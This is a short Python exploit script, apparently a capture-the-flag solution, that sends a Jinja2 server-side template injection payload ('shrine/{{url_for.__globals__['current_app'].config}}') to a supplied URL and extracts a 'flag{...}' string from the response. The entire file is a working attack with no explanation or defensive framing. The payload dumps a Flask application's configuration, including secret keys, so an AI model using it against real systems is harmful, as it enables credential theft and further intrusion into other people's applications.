from sys import argv

if __name__ == '__main__':
    try:
        url = argv[1]
    except Exception as e:
        print("python3 exp.py url")
    else:
        from requests import get

        payload = "shrine/{{url_for.__globals__['current_app'].config}}"
        url = url + payload
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/109.0.0.0 Safari/537.36 "
        }
        response = get(url=url).text

        from re import findall

        flag = "".join(findall("flag{.*?}", response))
        print(flag)
